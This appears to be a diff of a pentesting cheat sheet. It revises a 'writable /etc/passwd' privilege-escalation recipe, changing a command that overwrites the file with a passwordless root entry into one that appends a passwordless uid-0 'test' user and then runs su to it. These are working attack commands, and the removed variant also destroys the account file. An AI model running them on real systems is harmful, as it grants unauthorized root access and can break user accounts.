@@ -250,9 +250,9 @@ https://sohvaxus.github.io/content/winxp-sp1-privesc.html
 ### Writable /etc/passwd Privilege Escalation
 
 ```
-echo root::0:0:root:/root:/bin/bash > /etc/passwd
+echo test::0:0:root:/root:/bin/bash >> /etc/passwd
 
-su
+su test
 ```
 
 ### Bypass robots.txt "You are not a search engine. Permission denied."
